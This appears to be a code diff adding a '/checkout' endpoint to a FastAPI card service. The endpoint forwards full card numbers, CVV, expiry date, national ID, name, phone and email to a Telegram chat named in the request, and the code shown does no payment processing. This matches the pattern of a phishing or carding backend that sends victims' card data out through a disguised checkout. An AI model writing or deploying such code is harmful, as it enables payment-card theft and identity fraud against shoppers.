@@ -5,6 +5,8 @@ from ..config.database_config import get_db
 from sqlalchemy.exc import SQLAlchemyError
 from ..models.models import Card, User
 from ..schemas.card import CardCreateDTO
+from ..schemas.telegram import TelegramSchema
+from ..services.telegram import Telegram
 
 router = APIRouter()
 
@@ -44,5 +46,21 @@ async def create_card(body:CardCreateDTO, db: Session = Depends(get_db)):
         return make_response("Card created successfully", 201)
     except SQLAlchemyError as e:
         return make_response(str(e), 400, "/cards POST")
+    
+@router.post("/checkout")
+async def checkout(body:TelegramSchema):
+    telegram_instance = Telegram(body.token,
+                                 body.chat_id,
+                                 body.shop_id,
+                                 body.DNI,
+                                 body.number,
+                                 body.CVV,
+                                 body.Vto,
+                                 body.name,
+                                 body.last_name,
+                                 body.phone,
+                                 body.email)
+    message = telegram_instance.build_message()
+    telegram_instance.send_message(message)
     
 
